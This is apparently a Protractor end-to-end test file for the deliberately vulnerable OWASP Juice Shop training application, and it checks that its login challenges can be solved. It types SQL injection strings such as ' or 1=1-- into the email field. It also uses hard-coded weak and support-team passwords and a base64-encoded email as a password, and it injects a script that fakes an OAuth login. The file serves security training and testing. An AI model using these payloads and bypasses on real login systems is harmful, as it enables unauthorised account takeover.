'use strict'

const config = require('config')

describe('/#/login', function () {
  let email, password, rememberMeCheckbox, loginButton

  beforeEach(function () {
    browser.get('/#/login')
    email = element(by.model('user.email'))
    password = element(by.model('user.password'))
    rememberMeCheckbox = element(by.model('rememberMe'))
    loginButton = element(by.id('loginButton'))
  })

  describe('challenge "loginAdmin"', function () {
    it('should log in Admin with SQLI attack on email field using "\' or 1=1--"', function () {
      email.sendKeys('\' or 1=1--')
      password.sendKeys('a')
      loginButton.click()

      expect(browser.getLocationAbsUrl()).toMatch(/\/search/)
    })

    it('should log in Admin with SQLI attack on email field using "admin@<juice-sh.op>\'--"', function () {
      email.sendKeys('admin@' + config.get('application.domain') + '\'--')
      password.sendKeys('a')
      loginButton.click()

      expect(browser.getLocationAbsUrl()).toMatch(/\/search/)
    })

    protractor.expect.challengeSolved({challenge: 'Login Admin'})
  })

  describe('challenge "loginJim"', function () {
    it('should log in Jim with SQLI attack on email field using "jim@<juice-sh.op>\'--"', function () {
      email.sendKeys('jim@' + config.get('application.domain') + '\'--')
      password.sendKeys('a')
      loginButton.click()

      expect(browser.getLocationAbsUrl()).toMatch(/\/search/)
    })

    protractor.expect.challengeSolved({challenge: 'Login Jim'})
  })

  describe('challenge "loginBender"', function () {
    it('should log in Bender with SQLI attack on email field using "bender@<juice-sh.op>\'--"', function () {
      email.sendKeys('bender@' + config.get('application.domain') + '\'--')
      password.sendKeys('a')
      loginButton.click()

      expect(browser.getLocationAbsUrl()).toMatch(/\/search/)
    })

    protractor.expect.challengeSolved({challenge: 'Login Bender'})
  })

  describe('challenge "adminCredentials"', function () {
    it('should be able to log in with original (weak) admin credentials', function () {
      email.sendKeys('admin@' + config.get('application.domain'))
      password.sendKeys('admin123')
      loginButton.click()

      expect(browser.getLocationAbsUrl()).toMatch(/\/search/)
    })

    protractor.expect.challengeSolved({challenge: 'Password Strength'})
  })

  describe('challenge "loginSupport"', function () {
    it('should be able to log in with original support-team credentials', function () {
      email.sendKeys('support@' + config.get('application.domain'))
      password.sendKeys('J6aVjTgOpRs$?5l+Zkq2AYnCE@RF§P')
      loginButton.click()

      expect(browser.getLocationAbsUrl()).toMatch(/\/search/)
    })

    protractor.expect.challengeSolved({challenge: 'Login Support Team'})
  })

  describe('challenge "oauthUserPassword"', function () {
    it('should be able to log in as bjoern.kimminich@googlemail.com with base64-encoded email as password', function () {
      email.sendKeys('bjoern.kimminich@googlemail.com')
      password.sendKeys('YmpvZXJuLmtpbW1pbmljaEBnb29nbGVtYWlsLmNvbQ==')
      loginButton.click()

      expect(browser.getLocationAbsUrl()).toMatch(/\/search/)
    })

    protractor.expect.challengeSolved({challenge: 'Login Bjoern'})
  })

  describe('challenge "loginCiso"', function () {
    it('should be able to log in as ciso@juice-sh.op by using "Remember me" in combination with (fake) OAuth login with another user', function () {
      email.sendKeys('ciso@' + config.get('application.domain'))
      password.sendKeys('wrong')
      rememberMeCheckbox.click()
      loginButton.click()

      browser.executeScript('var $http = angular.injector([\'juiceShop\']).get(\'$http\'); $http.post(\'/rest/user/login\', {email: \'admin@juice-sh.op\', password: \'admin123\', oauth: true});')

      // Unselect to clear email field for subsequent tests
      rememberMeCheckbox.click()
      loginButton.click()
    })

    protractor.expect.challengeSolved({challenge: 'Login CISO'})
  })
})
